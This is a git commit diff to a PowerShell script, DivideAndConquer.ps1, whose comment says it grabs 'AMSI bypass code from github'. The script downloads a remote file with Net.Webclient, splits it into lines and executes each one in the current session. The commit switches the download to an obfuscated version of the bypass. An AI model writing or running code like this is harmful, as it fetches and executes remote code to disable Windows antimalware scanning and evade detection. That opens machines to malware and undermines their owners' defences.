8be47df0089dddb22726506a44e0ce2def2bf8ab
74l4r14 <98590947+74l4r14@users.noreply.github.com>
2025-11-05 16:15:46 +0000

    Update DivideAndConquer.ps1

--- DivideAndConquer.ps1
+++ DivideAndConquer.ps1
@@ -1,6 +1,6 @@
 
 #grab the AMSI bypass code from github
-$block = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/patch1.ps1")
+$block = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/patch1_obfuscatedBytes.ps1")
 
 # Split into lines and execute each one in current session
 $block -split "`r?`n" | ForEach-Object {
